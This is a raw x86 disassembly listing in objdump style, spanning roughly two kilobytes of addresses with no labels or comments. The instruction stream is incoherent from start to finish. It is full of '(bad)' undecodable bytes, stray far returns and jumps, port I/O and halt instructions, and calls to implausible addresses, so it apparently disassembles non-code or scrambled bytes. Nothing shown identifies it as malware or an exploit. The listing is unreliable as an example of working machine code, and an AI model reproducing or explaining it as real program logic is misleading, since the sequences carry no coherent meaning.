  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
